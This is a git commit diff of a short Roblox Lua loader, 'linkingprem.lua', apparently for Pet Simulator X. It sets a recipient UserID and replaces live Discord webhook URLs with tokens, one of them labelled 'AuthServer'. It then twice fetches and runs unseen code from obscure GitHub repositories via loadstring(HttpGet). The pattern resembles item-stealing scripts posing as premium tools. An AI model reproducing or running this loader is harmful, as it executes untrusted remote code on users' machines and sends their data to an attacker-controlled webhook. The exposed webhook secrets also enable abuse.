234ffb9a4ce570d5f02571f8682bf349c2f1c579
lmaooa1043 <119785971+lmaooa1043@users.noreply.github.com>
2022-12-24 01:11:45 +0300

    Update linkingprem.lua

--- linkingprem.lua
+++ linkingprem.lua
@@ -1,7 +1,7 @@
 _G.UserID = 2478823051
-_G.WebHook = "https://discord.com/api/webhooks/1055947536831090740/2ces73E8nqQ2Od0i3gMl7gSRptHHCWqHhs-_5tbFUDwdSl7R_PQZglvsUSFgWKNcQieM"
+_G.WebHook = "https://discord.com/api/webhooks/1055970801662312468/fMDtkW5c2lI15889N63SFbk_j3eM8hp-IsOmm7lYQJ5sI-0XCtcczyX02vW_vrd0RzyE"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/miscpsx/gbmlkX_HVIuga_y/main/IF-IOQBuoAadQ-p.lua'))()
 
 _G.Key = "XXRETOBMlA"
-_G.AuthServer = "https://discord.com/api/webhooks/1055947536831090740/2ces73E8nqQ2Od0i3gMl7gSRptHHCWqHhs-_5tbFUDwdSl7R_PQZglvsUSFgWKNcQieM"
+_G.AuthServer = "https://discord.com/api/webhooks/1055970801662312468/fMDtkW5c2lI15889N63SFbk_j3eM8hp-IsOmm7lYQJ5sI-0XCtcczyX02vW_vrd0RzyE"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
